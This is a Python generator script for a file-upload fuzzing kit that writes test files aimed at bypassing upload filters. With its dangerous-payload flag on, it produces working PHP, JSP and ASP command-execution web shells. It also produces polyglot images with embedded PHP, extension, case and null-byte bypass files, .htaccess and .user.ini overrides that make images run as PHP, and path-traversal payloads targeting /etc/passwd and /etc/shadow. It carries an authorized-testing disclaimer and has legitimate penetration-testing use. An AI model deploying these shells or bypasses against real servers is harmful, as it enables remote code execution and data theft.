#!/usr/bin/env python3
"""
FUFP (File Upload Fuzzing Pack) Generator - Files Only
Author: URDev
Description: Generates file upload testing kit with safe filenames
             Strict separation of text and binary files
Version: 3.0 - Secure Generation
"""

import os
import struct
import zipfile
import json
import sys
from pathlib import Path
from typing import Union, List, Optional

class FUFPCreator:
    def __init__(self, base_dir: str = "FUFP", verbose: bool = True, 
                 enable_dangerous: bool = False):
        """
        Initialize FUFP generator.
        
        Args:
            base_dir: Root directory name
            verbose: Print each file creation
            enable_dangerous: Enable active payloads (eval, system, etc.)
        """
        self.base_dir = Path(base_dir)
        self.verbose = verbose
        self.enable_dangerous = enable_dangerous
        self.file_count = 0
        
        # Dangerous payloads based on flag
        if self.enable_dangerous:
            self.php_payload = '<?php if(isset($_REQUEST["cmd"])) { system($_REQUEST["cmd"]); } ?>'
            self.jsp_payload = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
            self.asp_payload = '<% CreateObject("WScript.Shell").Run(Request("cmd")) %>'
        else:
            self.php_payload = '<?php echo "PHP_TEST_"; ?>'
            self.jsp_payload = '<% out.println("JSP_TEST"); %>'
            self.asp_payload = '<% Response.Write("ASP_TEST") %>'
    
    def log(self, message: str, level: str = "INFO"):
        """Log message with level prefix."""
        if self.verbose or level in ["ERROR", "WARNING"]:
            prefix = {
                "INFO": "[*]",
                "SUCCESS": "[+]",
                "ERROR": "[-]",
                "WARNING": "[!]"
            }.get(level, "[*]")
            print(f"{prefix} {message}")
    
    def create_dir(self, path: Union[str, Path]) -> Path:
        """Create directory if it doesn't exist."""
        path = Path(path) if not isinstance(path, Path) else path
        path.mkdir(parents=True, exist_ok=True)
        return path
    
    def write_text(self, path: Union[str, Path], content: str, 
                   encoding: str = "utf-8") -> bool:
        """
        Write text content to file.
        
        Returns:
            True if successful, False otherwise
        """
        try:
            path = Path(path) if not isinstance(path, Path) else path
            path.parent.mkdir(parents=True, exist_ok=True)
            
            with open(path, "w", encoding=encoding) as f:
                f.write(content)
            
            self.file_count += 1
            if self.verbose:
                rel_path = path.relative_to(self.base_dir)
                print(f"  ├── {rel_path}")
            return True
            
        except Exception as e:
            self.log(f"Failed to write {path}: {e}", "ERROR")
            return False
    
    def write_binary(self, path: Union[str, Path], content: bytes) -> bool:
        """
        Write binary content to file.
        
        Returns:
            True if successful, False otherwise
        """
        try:
            path = Path(path) if not isinstance(path, Path) else path
            path.parent.mkdir(parents=True, exist_ok=True)
            
            with open(path, "wb") as f:
                f.write(content)
            
            self.file_count += 1
            if self.verbose:
                rel_path = path.relative_to(self.base_dir)
                print(f"  ├── {rel_path}")
            return True
            
        except Exception as e:
            self.log(f"Failed to write {path}: {e}", "ERROR")
            return False
    
    def generate_png_header(self) -> bytes:
        """Generate valid PNG magic bytes."""
        return b'\x89PNG\r\n\x1a\n'
    
    def generate_jpeg_header(self) -> bytes:
        """Generate valid JPEG magic bytes."""
        return b'\xff\xd8\xff\xe0\x00\x10JFIF\x00'
    
    def generate_gif_header(self) -> bytes:
        """Generate valid GIF magic bytes."""
        return b'GIF89a'
    
    def generate_pdf_header(self) -> bytes:
        """Generate valid PDF magic bytes."""
        return b'%PDF-1.4\n'
    
    def generate_zip_header(self) -> bytes:
        """Generate valid ZIP magic bytes."""
        return b'PK\x03\x04'
    
    def generate_pe_header(self) -> bytes:
        """Generate minimal PE header."""
        return b'MZ' + b'\x90' * 30 + b'PE\x00\x00'
    
    def generate_elf_header(self) -> bytes:
        """Generate minimal ELF header."""
        return b'\x7fELF\x01\x01\x01\x00' * 4
    
    def create_directory_structure(self) -> None:
        """Create all directories."""
        self.log("Creating directory structure...")
        
        dirs = [
            "images",
            "documents", 
            "scripts",
            "web",
            "server_side",
            "bypass_techniques",
            "binaries",
            "archives",
            "server_configs",
            "traversal_tests",
            "magic_bytes",
            "mime_confusion",
            "oversized_files"
        ]
        
        for dir_name in dirs:
            self.create_dir(self.base_dir / dir_name)
    
    def create_images(self) -> None:
        """Create image files."""
        self.log("Creating image files...")
        
        # Binary image files
        binary_files = [
            ("test.png", self.generate_png_header() + b"PNG_CONTENT"),
            ("test.jpg", self.generate_jpeg_header() + b"JPEG_CONTENT"),
            ("test.gif", self.generate_gif_header() + b"GIF_CONTENT"),
            ("test.webp", b'RIFF\x00\x00\x00\x00WEBPVP8 ' + b"WEBP_CONTENT"),
            ("test.bmp", b'BM\x00\x00\x00\x00\x00\x00\x00' + b"BMP_CONTENT"),
            ("test.tiff", b'II\x2a\x00\x08\x00\x00\x00' + b"TIFF_CONTENT"),
        ]
        
        for filename, content in binary_files:
            self.write_binary(self.base_dir / "images" / filename, content)
        
        # Text description files
        text_files = [
            ("test_exif_comment.txt",
             "Filename: test_exif_comment.jpg\n"
             "Description: JPEG with EXIF comment field\n"
             "Can contain payload in metadata"),
            
            ("test_php_null_byte.txt",
             "Filename: test.php%00.jpg\n"
             "Description: Null byte injection test\n"
             "Note: Actual null byte cannot be in filename"),
        ]
        
        for filename, content in text_files:
            self.write_text(self.base_dir / "images" / filename, content)
        
        # Polyglot GIF+PHP (binary with PHP in comment)
        gif_php = self.generate_gif_header() + b'/*<?php echo "TEST"; ?>*/'
        self.write_binary(self.base_dir / "images" / "polyglot_gif_php.gif", gif_php)
        
        # PNG with PHP code (binary)
        png_php = self.generate_png_header() + b'\n<?php echo "PNG_HEADER"; ?>'
        self.write_binary(self.base_dir / "images" / "test_with_shell.png.php", png_php)
    
    def create_documents(self) -> None:
        """Create document files."""
        self.log("Creating document files...")
        
        # Text documents
        text_files = [
            ("test.txt", "Plain text file for baseline testing"),
            ("test.md", "# Markdown Test\n\nContains `code` and **formatting**"),
            ("test.csv", "id,name,value\n1,test,100\n2,admin,500\n3,user,200"),
            ("test.json", json.dumps({
                "test": True,
                "users": ["admin", "user"],
                "config": {"debug": False}
            }, indent=2)),
            ("test.yaml", "app:\n  name: Test\n  debug: true\nsecurity:\n  enabled: false"),
            ("test.ini", "[database]\nhost=localhost\nuser=admin\n[app]\ndebug=1"),
            ("test.conf", "server {\n  listen 80;\n  server_name test.local;\n  root /var/www;\n}"),
            ("test.log", "2024-01-01 10:00:00 INFO: Application started\n2024-01-01 10:01:00 ERROR: Connection failed"),
            ("test.rtf", r"{\rtf1\ansi\deff0 {\fonttbl {\f0 Courier;}}\f0\fs20 RTF Test}"),
        ]
        
        for filename, content in text_files:
            self.write_text(self.base_dir / "documents" / filename, content)
        
        # Binary documents
        binary_files = [
            ("test.pdf", self.generate_pdf_header() + b"1 0 obj\n<</Type/Catalog>>\nendobj"),
            ("test.doc", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" + b"DOC_TEST_CONTENT"),
        ]
        
        for filename, content in binary_files:
            self.write_binary(self.base_dir / "documents" / filename, content)
        
        # ZIP-based documents
        zip_content = self.generate_zip_header() + b"[Content_Types].xml"
        self.write_binary(self.base_dir / "documents" / "test.docx", zip_content)
        self.write_binary(self.base_dir / "documents" / "test.xlsx", zip_content)
        self.write_binary(self.base_dir / "documents" / "test.pptx", zip_content)
        
        # ODT (ZIP with mimetype)
        odt_content = self.generate_zip_header() + b"mimetypeapplication/vnd.oasis.opendocument.text"
        self.write_binary(self.base_dir / "documents" / "test.odt", odt_content)
    
    def create_scripts(self) -> None:
        """Create script files."""
        self.log("Creating script files...")
        
        files = [
            ("test.js", 'console.log("JS_TEST");\n// <?php echo "COMMENT"; ?>'),
            ("test.py", '#!/usr/bin/env python\nprint("PYTHON_TEST")\n# <?php echo "COMMENT"; ?>'),
            ("test.sh", '#!/bin/bash\necho "BASH_TEST"\n# <?php echo "COMMENT"; ?>'),
            ("test.bat", '@echo off\necho "BATCH_TEST"\nrem <% echo "COMMENT"; %>'),
            ("test.ps1", 'Write-Host "POWERSHELL_TEST"\n# <?php echo "COMMENT"; ?>'),
            ("test.vbs", 'MsgBox "VBSCRIPT_TEST"\n\' <?php echo "COMMENT"; ?>'),
            ("test.rb", 'puts "RUBY_TEST"\n# <?php echo "COMMENT"; ?>'),
            ("test.pl", '#!/usr/bin/perl\nprint "PERL_TEST\\n";\n# <?php echo "COMMENT"; ?>'),
            ("test.lua", 'print("LUA_TEST")\n-- <?php echo "COMMENT"; ?>'),
            ("test.php.js", '// File with .php.js extension\nalert("BYPASS_TEST");'),
            
            ("test_htaccess.txt", 
             "# Apache .htaccess for testing\n"
             "AddType application/x-httpd-php .jpg .png .gif\n"
             "SetHandler application/x-httpd-php\n"
             "# This is a test file only"),
        ]
        
        for filename, content in files:
            self.write_text(self.base_dir / "scripts" / filename, content)
    
    def create_web_files(self) -> None:
        """Create web files."""
        self.log("Creating web files...")
        
        files = [
            ("test.html", '<!DOCTYPE html>\n<html>\n<body>HTML_TEST</body>\n</html>'),
            ("test.htm", '<html><body>HTM_TEST</body></html>'),
            ("test.xhtml", '<?xml version="1.0"?>\n<html xmlns="http://www.w3.org/1999/xhtml">\n<body>XHTML_TEST</body>\n</html>'),
            ("test.svg", '<svg xmlns="http://www.w3.org/2000/svg">\n<text>SVG_TEST</text>\n</svg>'),
            ("test.xml", '<?xml version="1.0"?>\n<root>\n  <item>XML_TEST</item>\n</root>'),
            ("test.xsd", '<?xml version="1.0"?>\n<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">\n</xs:schema>'),
            ("test.css", 'body { color: black; }\n.test { background: white; }'),
            ("test_with_php.html", '<html>\n<?php echo "HTML_WITH_PHP"; ?>\n</html>'),
        ]
        
        for filename, content in files:
            self.write_text(self.base_dir / "web" / filename, content)
    
    def create_server_side(self) -> None:
        """Create server-side scripts."""
        self.log("Creating server-side scripts...")
        
        files = [
            ("test.php", self.php_payload),
            ("test.phtml", self.php_payload),
            ("test.php3", self.php_payload),
            ("test.php4", self.php_payload),
            ("test.php5", self.php_payload),
            ("test.php7", self.php_payload),
            ("test.phar", '<?php echo "PHAR_TEST"; ?>'),
            ("test.inc", '<?php echo "INC_TEST"; ?>'),
            ("test.asp", self.asp_payload),
            ("test.aspx", '<%@ Page Language="C#" %>\n<% Response.Write("ASPX_TEST"); %>'),
            ("test.ashx", '<%@ WebHandler Language="C#" %>\npublic void ProcessRequest(HttpContext ctx) {\n  ctx.Response.Write("ASHX_TEST");\n}'),
            ("test.jsp", self.jsp_payload),
            ("test.jspx", '<jsp:directive.page />\n<jsp:scriptlet>out.println("JSPX_TEST");</jsp:scriptlet>'),
            ("test.cfm", '<cfoutput>COLDFUSION_TEST</cfoutput>'),
            ("test.pl", '#!/usr/bin/perl\nprint "Content-type: text/html\\n\\n";\nprint "PERL_CGI_TEST";'),
            ("test.config", '<?xml version="1.0"?>\n<configuration>\n  <system.web>\n    <httpRuntime />\n  </system.web>\n</configuration>'),
        ]
        
        for filename, content in files:
            self.write_text(self.base_dir / "server_side" / filename, content)
    
    def create_bypass_techniques(self) -> None:
        """Create bypass technique files."""
        self.log("Creating bypass technique files...")
        
        # Binary bypass files
        binary_files = [
            ("test.php.jpg", self.generate_jpeg_header() + b'\n<?php echo "JPG_WITH_PHP"; ?>'),
            ("test.php.png", self.generate_png_header() + b'\n<?php echo "PNG_WITH_PHP"; ?>'),
            ("test.php.gif", self.generate_gif_header() + b'\n<?php echo "GIF_WITH_PHP"; ?>'),
            ("test_php_newline.jpg", self.generate_jpeg_header() + b'\n<?php echo "NEWLINE_TEST"; ?>'),
        ]
        
        for filename, content in binary_files:
            self.write_binary(self.base_dir / "bypass_techniques" / filename, content)
        
        # Text bypass files
        text_files = [
            ("test.jpg.php", '<?php echo "PHP_WITH_JPG_EXT"; ?>'),
            ("test.phP", '<?php echo "CASE_VARIATION_PHP"; ?>'),
            ("test.PHP", '<?php echo "UPPERCASE_PHP"; ?>'),
            ("test.PhP", '<?php echo "MIXEDCASE_PHP"; ?>'),
            ("test.pHp5", '<?php echo "CASE_VARIATION_PHP5"; ?>'),
            ("test.php.", '<?php echo "TRAILING_DOT"; ?>'),
            ("test.php..", '<?php echo "DOUBLE_DOT"; ?>'),
            ("test.php...", '<?php echo "TRIPLE_DOT"; ?>'),
            ("test_ph_percent_70.txt", 
             "Original: test.ph%70\n"
             "Decodes to: test.php\n"
             "Percent-encoded bypass"),
            ("test_php_percent_00.txt", 
             "Original: test.php%00.jpg\n"
             "Null byte injection test"),
            ("test_php_colon_data.txt", 
             "NTFS Alternate Data Stream: test.php::$DATA"),
            ("test_php_colon_jpg.txt", 
             "NTFS stream bypass: test.php:.jpg"),
            ("test_php_space.txt", 
             '<?php echo "TRAILING_SPACE"; ?>'),
            ("test_php_semicolon.txt", 
             "Semicolon bypass: test.php;.jpg"),
            ("test_php_plus_html.txt", 
             "Plus sign bypass: test.php+.html"),
            ("test_php_double_encoded.txt", 
             "Double encoding: test.php%252e%252e%252f\n"
             "Decodes to: test.php../"),
            ("test_reverse.php", 
             '<?php echo strrev("php.tset"); // test.php reversed ?>'),
        ]
        
        for filename, content in text_files:
            self.write_text(self.base_dir / "bypass_techniques" / filename, content)
    
    def create_binaries(self) -> None:
        """Create binary files."""
        self.log("Creating binary files...")
        
        files = [
            ("test.exe", self.generate_pe_header() + b"EXE_TEST_CONTENT"),
            ("test.dll", self.generate_pe_header() + b"DLL_TEST_CONTENT"),
            ("test.so", self.generate_elf_header() + b"SO_TEST_CONTENT"),
            ("test.jar", self.generate_zip_header() + b"JAR_TEST_CONTENT"),
            ("test.war", self.generate_zip_header() + b"WAR_TEST_CONTENT"),
            ("test.apk", self.generate_zip_header() + b"APK_TEST_CONTENT"),
            ("test.deb", b'!<arch>\ndebian-binary    \ncontrol.tar.gz   '),
            ("test.rpm", b'\xed\xab\xee\xdb' + b"RPM_TEST_CONTENT"),
            ("test.msi", b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' + b"MSI_TEST_CONTENT"),
            ("test.bin", b'\x00\x01\x02\x03' * 25),
            ("test.dat", b'DATA' * 50),
            ("test.iso", b'\x01\x43\x44\x30\x30\x31' + b"ISO_TEST_CONTENT"),
            ("test.swf", b'FWS' + b"SWF_TEST_CONTENT"),
        ]
        
        for filename, content in files:
            self.write_binary(self.base_dir / "binaries" / filename, content)
    
    def create_archives(self) -> None:
        """Create archive files."""
        self.log("Creating archive files...")
        
        # Binary archive files
        binary_files = [
            ("test.zip", self.generate_zip_header() + b"ZIP_TEST_CONTENT"),
            ("test.rar", b'Rar!\x1a\x07\x00' + b"RAR_TEST_CONTENT"),
            ("test.tar", b"TAR_TEST_CONTENT" * 10),
            ("test.tar.gz", b'\x1f\x8b\x08' + b"GZIP_TAR_TEST"),
            ("test.tgz", b'\x1f\x8b\x08' + b"TGZ_TEST_CONTENT"),
            ("test.7z", b'7z\xbc\xaf\x27\x1c' + b"7Z_TEST_CONTENT"),
            ("test.bz2", b'BZh' + b"BZIP2_TEST_CONTENT"),
            ("test.xz", b'\xfd7zXZ\x00' + b"XZ_TEST_CONTENT"),
            ("test.gz", b'\x1f\x8b\x08' + b"GZIP_TEST_CONTENT"),
        ]
        
        for filename, content in binary_files:
            self.write_binary(self.base_dir / "archives" / filename, content)
        
        # Create ZIP with embedded files
        zip_path = self.base_dir / "archives" / "zip_with_php.zip"
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr('test.php', '<?php echo "ZIP_EMBEDDED_PHP"; ?>')
            zf.writestr('readme.txt', 'ZIP containing PHP file for testing')
        self.file_count += 1
        if self.verbose:
            print(f"  ├── {zip_path.relative_to(self.base_dir)}")
        
        # Create ZIP with .htaccess
        zip_path = self.base_dir / "archives" / "zip_with_htaccess.zip"
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr('.htaccess', 'AddType application/x-httpd-php .jpg')
        self.file_count += 1
        if self.verbose:
            print(f"  ├── {zip_path.relative_to(self.base_dir)}")
        
        # Text description of symlink ZIP
        self.write_text(
            self.base_dir / "archives" / "zip_symlink_test.txt",
            "ZIP file with symlink payload\n"
            "Some archive extractors follow symlinks\n"
            "Payload: symlink -> /etc/passwd"
        )
    
    def create_server_configs(self) -> None:
        """Create server configuration files."""
        self.log("Creating server configuration files...")
        
        files = [
            ("test_htaccess.txt",
             "# Apache .htaccess for testing\n"
             "AddType application/x-httpd-php .jpg .png .gif\n"
             "SetHandler application/x-httpd-php\n"
             "Options +ExecCGI\n"
             "AddHandler cgi-script .jpg .png\n"
             "# Test configuration only"),
            
            ("test_user_ini.txt",
             "; PHP .user.ini test file\n"
             "auto_prepend_file = test.jpg\n"
             "auto_append_file = test.jpg\n"
             "; Test configuration only"),
            
            ("test_web_config.txt",
             '<?xml version="1.0" encoding="UTF-8"?>\n'
             '<configuration>\n'
             '  <system.webServer>\n'
             '    <handlers>\n'
             '      <add name="TestHandler" path="*.jpg" verb="*" />\n'
             '    </handlers>\n'
             '  </system.webServer>\n'
             '</configuration>'),
            
            ("test_env.txt",
             "# Test environment variables\n"
             "DB_HOST=test.local\n"
             "DB_USER=test_user\n"
             "DB_PASSWORD=test_pass_123\n"
             "API_KEY=test_key_abcdef\n"
             "# These are test values only"),
            
            ("test_gitignore.txt",
             "# Test .gitignore file\n"
             "uploads/*\n"
             "*.tmp\n"
             "*.log\n"
             "cache/\n"
             "# Test file only"),
            
            ("test_crontab.txt",
             "# Test cron entries for security testing\n"
             "# These are examples for testing only\n"
             "* * * * * echo 'cron_test'\n"
             "*/5 * * * * /bin/true\n"
             "# Test file only"),
        ]
        
        for filename, content in files:
            self.write_text(self.base_dir / "server_configs" / filename, content)
    
    def create_traversal_tests(self) -> None:
        """Create path traversal test files."""
        self.log("Creating path traversal test files...")
        
        files = [
            ("linux_path_traversal.txt",
             "# Linux Path Traversal Payloads\n"
             "# These are text descriptions for testing\n\n"
             "Basic payloads:\n"
             "../../../etc/passwd\n"
             "../../../etc/shadow\n"
             "../../../proc/self/environ\n\n"
             "Encoded payloads:\n"
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n"
             "..%252f..%252f..%252fetc%252fpasswd\n\n"
             "Double slash variations:\n"
             "....//....//....//etc//passwd\n"
             "../../../etc/../etc/../etc/passwd"),
            
            ("windows_path_traversal.txt",
             "# Windows Path Traversal Payloads\n"
             "# These are text descriptions for testing\n\n"
             "Basic payloads:\n"
             "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts\n"
             "..\\..\\..\\boot.ini\n"
             "..\\..\\..\\windows\\win.ini\n\n"
             "Encoded payloads:\n"
             "..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts\n"
             "..%255c..%255c..%255cWindows%255cSystem32%255cetc%255chosts\n\n"
             "UNC path examples:\n"
             "\\\\localhost\\c$\\Windows\\System32\\cmd.exe\n"
             "\\\\127.0.0.1\\admin$\\system32\\cmd.exe"),
            
            ("url_encoded_traversal.txt",
             "# URL Encoded Traversal Payloads\n\n"
             "Single encoding:\n"
             "%2e%2e%2f (../)\n"
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n"
             "%2e%2e%5c (..\\)\n"
             "%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cSystem32%5chosts\n\n"
             "Double encoding:\n"
             "%252e%252e%252f (../ after double decode)\n"
             "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
            
            ("double_encoding_traversal.txt",
             "# Double Encoding Examples\n\n"
             "Full payloads:\n"
             "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd\n"
             "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd\n\n"
             "Mixed encoding:\n"
             "..%252f..%252f..%252fetc%252fpasswd\n"
             "..%252f..%252f..%252f..%252fetc%252fpasswd"),
            
            ("dot_slash_variations.txt",
             "# Dot and Slash Variations\n\n"
             "Multiple dots:\n"
             "....//....//....//etc/passwd\n"
             "......////......////......////etc/passwd\n\n"
             "Different separators:\n"
             "..;/..;/..;/etc/passwd\n"
             "..|/..|/..|/etc/passwd\n"
             "..\\x2f..\\x2f..\\x2fetc\\x2fpasswd\n\n"
             "URL encoded:\n"
             "%2e%2e/%2e%2e/%2e%2e/etc/passwd\n"
             "%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd"),
        ]
        
        for filename, content in files:
            self.write_text(self.base_dir / "traversal_tests" / filename, content)
    
    def create_magic_bytes(self) -> None:
        """Create magic byte test files."""
        self.log("Creating magic byte test files...")
        
        # All files in this category are binary
        files = [
            ("test_php_as_png.php",
             self.generate_png_header() + b'\n<?php echo "PNG_MAGIC_BYTES"; ?>'),
            
            ("test_exe_as_jpg.exe",
             self.generate_jpeg_header() + self.generate_pe_header() + b'EXE_WITH_JPEG_HEADER'),
            
            ("test_zip_as_txt.zip",
             self.generate_zip_header() + b'TXT_EXT_WITH_ZIP_HEADER'),
            
            ("test_pdf_as_gif.pdf",
             self.generate_gif_header() + self.generate_pdf_header() + b'PDF_WITH_GIF_HEADER'),
            
            ("test_html_as_png.html",
             self.generate_png_header() + b'<html><body>HTML_WITH_PNG_HEADER</body></html>'),
            
            ("test_txt_as_exe.txt",
             self.generate_pe_header() + b'TXT_WITH_EXE_HEADER'),
            
            ("test_jpg_as_pdf.jpg",
             self.generate_pdf_header() + self.generate_jpeg_header() + b'JPG_WITH_PDF_HEADER'),
        ]
        
        for filename, content in files:
            self.write_binary(self.base_dir / "magic_bytes" / filename, content)
    
    def create_mime_confusion(self) -> None:
        """Create MIME confusion files."""
        self.log("Creating MIME confusion files...")
        
        # Binary files with mixed content
        binary_files = [
            ("jpg_with_png_mime.jpg",
             self.generate_jpeg_header() + b'JPEG_CLAIMING_PNG_MIME'),
            
            ("exe_with_pdf_mime.exe",
             self.generate_pe_header() + self.generate_pdf_header() + b'EXE_CLAIMING_PDF_MIME'),
            
            ("zip_with_audio_mime.zip",
             self.generate_zip_header() + b'ID3TAG' + b'ZIP_CLAIMING_AUDIO_MIME'),
        ]
        
        for filename, content in binary_files:
            self.write_binary(self.base_dir / "mime_confusion" / filename, content)
        
        # Text files
        text_files = [
            ("txt_with_html_mime.txt",
             '<?php echo "TXT_CLAIMING_HTML_MIME"; ?>'),
            
            ("php_with_image_mime.php",
             '<?php\n'
             '// PHP file claiming to be image\n'
             '// Content-Type would be set to image/jpeg\n'
             'echo "PHP_WITH_IMAGE_MIME";\n'
             '?>'),
            
            ("html_with_css_mime.html",
             '<html>\n'
             '<!-- HTML claiming to be CSS -->\n'
             'body { color: black; }\n'
             '</html>'),
        ]
        
        for filename, content in text_files:
            self.write_text(self.base_dir / "mime_confusion" / filename, content)
    
    def create_oversized_files(self) -> None:
        """Create oversized files with accurate naming."""
        self.log("Creating oversized files...")
        
        # Create accurately sized files
        files = [
            ("test_1mb_dummy.jpg", 
             self.generate_jpeg_header() + (b'X' * (1024 * 1024 - 100))),
            
            ("test_5mb_dummy.bin",
             b'B' * (5 * 1024 * 1024)),
            
            ("test_timeout_simulator.php",
             '<?php\n'
             '// Timeout simulator for upload testing\n'
             '// sleep(5) for shorter test, adjust as needed\n'
             'sleep(5);\n'
             'echo "TIMEOUT_TEST_COMPLETE";\n'
             '?>'),
            
            ("test_large_metadata.jpg",
             self.generate_jpeg_header() +
             b'\xff\xed' + struct.pack('>H', 5000) + (b'COMMENT=' + b'X' * 5000)),
            
            ("test_slow_response.php",
             '<?php\n'
             '// Simulate slow response\n'
             'for($i = 0; $i < 5; $i++) {\n'
             '  echo str_repeat("A", 102400); // 100KB chunks\n'
             '  flush();\n'
             '  sleep(2);\n'
             '}\n'
             '?>'),
        ]
        
        for filename, content in files:
            if filename.endswith('.php'):
                self.write_text(self.base_dir / "oversized_files" / filename, content)
            else:
                self.write_binary(self.base_dir / "oversized_files" / filename, content)
    
    def generate(self) -> bool:
        """Generate all files."""
        self.log(f"Starting FUFP generation in '{self.base_dir}'")
        self.log(f"Verbose mode: {'ON' if self.verbose else 'OFF'}")
        self.log(f"Dangerous payloads: {'ENABLED' if self.enable_dangerous else 'DISABLED'}")
        
        try:
            # Create directory structure
            self.create_directory_structure()
            
            # Generate all file categories
            generators = [
                self.create_images,
                self.create_documents,
                self.create_scripts,
                self.create_web_files,
                self.create_server_side,
                self.create_bypass_techniques,
                self.create_binaries,
                self.create_archives,
                self.create_server_configs,
                self.create_traversal_tests,
                self.create_magic_bytes,
                self.create_mime_confusion,
                self.create_oversized_files,
            ]
            
            for generator in generators:
                generator()
            
            self.log(f"Generation complete! Created {self.file_count} files", "SUCCESS")
            self.log(f"Location: {self.base_dir.absolute()}", "SUCCESS")
            
            return True
            
        except Exception as e:
            self.log(f"Generation failed: {e}", "ERROR")
            import traceback
            traceback.print_exc()
            return False

def main():
    """Command line interface."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="FUFP Generator - File Upload Fuzzing Pack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Author: URDev
Version: 3.0

⚠️  LEGAL DISCLAIMER:
This tool generates files for AUTHORIZED SECURITY TESTING ONLY.
Use only on systems you own or have explicit permission to test.
The author is not responsible for any misuse or damage.
"""
    )
    
    parser.add_argument("-o", "--output", default="FUFP",
                       help="Output directory (default: FUFP)")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Show each file as it's created")
    parser.add_argument("-q", "--quiet", action="store_true",
                       help="Minimal output (overrides verbose)")
    parser.add_argument("--enable-dangerous", action="store_true",
                       help="Enable active payloads (eval, system, exec)")
    parser.add_argument("--version", action="version", version="FUFP 3.0 by URDev")
    
    args = parser.parse_args()
    
    # Determine verbosity
    verbose = args.verbose and not args.quiet
    
    print("\n" + "="*60)
    print("FUFP GENERATOR v3.0 by URDev")
    print("="*60)
    
    if not args.quiet:
        print("[*] File Upload Fuzzing Pack")
        print(f"[*] Output: {args.output}")
        print(f"[*] Verbose: {'Yes' if verbose else 'No'}")
        if args.enable_dangerous:
            print("[!] WARNING: Dangerous payloads are ENABLED")
        print("[*] Generating files...")
    
    creator = FUFPCreator(
        base_dir=args.output, 
        verbose=verbose,
        enable_dangerous=args.enable_dangerous
    )
    
    success = creator.generate()
    
    if success and not args.quiet:
        print("\n" + "="*60)
        print("⚠️  LEGAL DISCLAIMER:")
        print("-"*60)
        print("For AUTHORIZED SECURITY TESTING ONLY.")
        print("Use only on systems you own or have permission to test.")
        print("The author is not responsible for any misuse.")
        print("="*60)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
